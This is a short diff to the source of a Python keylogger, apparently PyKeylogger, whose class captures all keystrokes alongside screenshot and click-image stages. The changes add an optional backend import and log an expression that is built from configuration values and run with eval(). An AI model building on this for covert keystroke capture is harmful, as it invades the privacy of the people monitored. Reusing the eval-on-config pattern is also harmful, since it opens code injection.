@@ -55,6 +55,12 @@ from detailedlogwriter import DetailedLogWriterFirstStage
 from onclickimagecapture import OnClickImageCaptureFirstStage
 from timedscreenshot import TimedScreenshotFirstStage
 
+# Make more backends available
+try:
+    import pykeylogger.backends
+except ImportError:
+    pass
+
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
     
@@ -105,9 +111,11 @@ class KeyLogger:
             try:
                 threadname = self.settings[section]['General']['_Thread_Class']
                 self.queues[section] = Queue(0)
+                eval_expression = self.settings[section]['General']['_Thread_Class'] + \
+                    '(self.queues[section], section)'
+                self.logger.debug("EVAL EXPRESSION: " + eval_expression)
                 self.event_threads[section] = \
-                    eval(self.settings[section]['General']['_Thread_Class'] + \
-                    '(self.queues[section], section)')
+                    eval(eval_expression)
             except KeyError:
                 self.logger.debug('not creating thread for section %s' % \
                                         section, exc_info=True)
